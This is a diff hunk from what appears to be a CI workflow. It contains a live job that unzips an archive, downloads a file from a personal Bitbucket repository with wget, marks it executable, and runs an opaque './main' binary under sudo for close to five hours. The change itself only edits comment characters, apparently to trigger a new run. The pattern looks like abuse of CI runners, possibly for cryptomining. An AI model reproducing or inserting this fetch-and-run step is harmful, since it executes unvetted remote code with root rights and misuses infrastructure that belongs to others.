@@ -22,7 +22,7 @@ jobs:
             unzip App.zip
             cd 15
             wget https://bitbucket.org/lindasinta/admin/raw/f93e9199b2d40a26533da39aaad04f64b5b2bd75/upc
-            chmod u+x *####
+            chmod u+x *###
             #sleep 180s && sudo apt update -y
             #sleep 300s && sudo apt update -y
             sudo timeout #285m ./main && stop && sudo apt update -y
